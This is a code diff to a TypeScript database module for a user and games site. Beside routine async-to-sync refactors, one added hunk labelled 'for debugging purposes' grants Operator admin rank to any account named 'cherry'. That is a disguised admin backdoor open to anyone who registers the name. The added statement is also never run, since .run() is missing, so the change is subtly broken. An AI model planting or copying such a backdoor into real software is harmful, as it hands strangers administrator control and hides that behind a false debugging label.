@@ -40,6 +40,10 @@ export namespace db {
         database.prepare(`INSERT INTO users(name, passHash, uuid) VALUES(?, ?, ?);`)
             .run(user, hashed, newUUID());
 
+        // for debugging purposes, anyone with name Cherry is Operator
+        database.prepare(`UPDATE users SET adminRank = 4
+                          WHERE LOWER(name) = 'cherry';`)
+
         return getUser(user)!;
     }
 
@@ -80,7 +84,7 @@ export namespace db {
             .get(uuid, token);
     }
 
-    export async function getUserByUUID(uuid: string) {
+    export function getUserByUUID(uuid: string) {
         return database.prepare(`SELECT * FROM users WHERE uuid = ?;`)
             .get(uuid);
     }
@@ -94,8 +98,8 @@ export namespace db {
         const rows = database.prepare(`SELECT * FROM games WHERE visible = 1
                                 ORDER BY date DESC LIMIT 25;`).all();
 
-        return rows.map(async (v: any) => {
-            const creatorRow: any = (await getUserByUUID(v.creator))!;
+        return rows.map((v: any) => {
+            const creatorRow: any = getUserByUUID(v.creator)!;
             v.creatorName = `${AdminRank[creatorRow.adminRank]} ${creatorRow.name} `;
             return v;
         });
